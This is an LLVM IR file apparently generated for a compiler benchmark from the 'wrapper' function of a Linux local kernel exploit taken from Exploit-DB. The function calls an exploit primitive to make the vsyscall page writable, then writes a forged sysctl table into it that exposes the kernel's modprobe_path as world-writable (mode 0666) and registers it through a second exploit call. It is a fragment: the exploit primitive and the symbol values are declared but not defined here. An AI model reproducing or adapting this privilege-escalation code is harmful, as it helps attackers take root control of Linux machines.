; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_wrapper.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_wrapper.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ctl_table = type { i8*, i32, i32, i8*, i8*, i8*, i8* }

@.str = private unnamed_addr constant [39 x i8] c"[.] making vsyscall page writable...\0A\0A\00", align 1
@SET_MEMORY_RW = common dso_local global i32 0, align 4
@VSYSCALL = common dso_local global i64 0, align 8
@verify_stage1 = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"[~] done, stage 1 completed\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"[.] registering new sysctl...\0A\0A\00", align 1
@SYSCTL_NAME = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"\01\00\00\00\00", align 1
@PROC_DOSTRING = common dso_local global i64 0, align 8
@MODPROBE_PATH = common dso_local global i64 0, align 8
@REGISTER_SYSCTL_TABLE = common dso_local global i32 0, align 4
@verify_stage2 = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [29 x i8] c"[~] done, stage 2 completed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @wrapper() #0 {
  %1 = alloca %struct.ctl_table*, align 8
  %2 = call i32 @dprintf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %3 = load i32, i32* @SET_MEMORY_RW, align 4
  %4 = load i64, i64* @VSYSCALL, align 8
  %5 = load i32, i32* @verify_stage1, align 4
  %6 = call i32 @exploit(i32 %3, i64 %4, i32 %5)
  %7 = call i32 @dprintf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @sleep(i32 5)
  %9 = call i32 @dprintf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %10 = load i64, i64* @VSYSCALL, align 8
  %11 = add nsw i64 %10, 2128
  %12 = inttoptr i64 %11 to %struct.ctl_table*
  store %struct.ctl_table* %12, %struct.ctl_table** %1, align 8
  %13 = load i64, i64* @VSYSCALL, align 8
  %14 = add nsw i64 %13, 2128
  %15 = inttoptr i64 %14 to i8*
  %16 = call i32 @memset(i8* %15, i8 signext 0, i32 1952)
  %17 = load i64, i64* @VSYSCALL, align 8
  %18 = add nsw i64 %17, 3840
  %19 = inttoptr i64 %18 to i8*
  %20 = load i32, i32* @SYSCTL_NAME, align 4
  %21 = call i32 @strcpy(i8* %19, i32 %20)
  %22 = load i64, i64* @VSYSCALL, align 8
  %23 = add nsw i64 %22, 3584
  %24 = inttoptr i64 %23 to i8*
  %25 = call i32 @memcpy(i8* %24, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 4)
  %26 = load i64, i64* @VSYSCALL, align 8
  %27 = add nsw i64 %26, 3840
  %28 = inttoptr i64 %27 to i8*
  %29 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %30 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %29, i32 0, i32 0
  store i8* %28, i8** %30, align 8
  %31 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %32 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %31, i32 0, i32 1
  store i32 438, i32* %32, align 8
  %33 = load i64, i64* @PROC_DOSTRING, align 8
  %34 = inttoptr i64 %33 to i8*
  %35 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %36 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %35, i32 0, i32 6
  store i8* %34, i8** %36, align 8
  %37 = load i64, i64* @MODPROBE_PATH, align 8
  %38 = inttoptr i64 %37 to i8*
  %39 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %40 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %39, i32 0, i32 5
  store i8* %38, i8** %40, align 8
  %41 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %42 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %41, i32 0, i32 2
  store i32 256, i32* %42, align 4
  %43 = load i64, i64* @VSYSCALL, align 8
  %44 = add nsw i64 %43, 3584
  %45 = inttoptr i64 %44 to i8*
  %46 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %47 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %46, i32 0, i32 4
  store i8* %45, i8** %47, align 8
  %48 = load i64, i64* @VSYSCALL, align 8
  %49 = add nsw i64 %48, 3328
  %50 = inttoptr i64 %49 to i8*
  %51 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %52 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %51, i32 0, i32 3
  store i8* %50, i8** %52, align 8
  %53 = load i32, i32* @REGISTER_SYSCTL_TABLE, align 4
  %54 = load i64, i64* @VSYSCALL, align 8
  %55 = add nsw i64 %54, 2128
  %56 = load i32, i32* @verify_stage2, align 4
  %57 = call i32 @exploit(i32 %53, i64 %55, i32 %56)
  %58 = call i32 @dprintf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  ret void
}

declare dso_local i32 @dprintf(i8*) #1

declare dso_local i32 @exploit(i32, i64, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strcpy(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
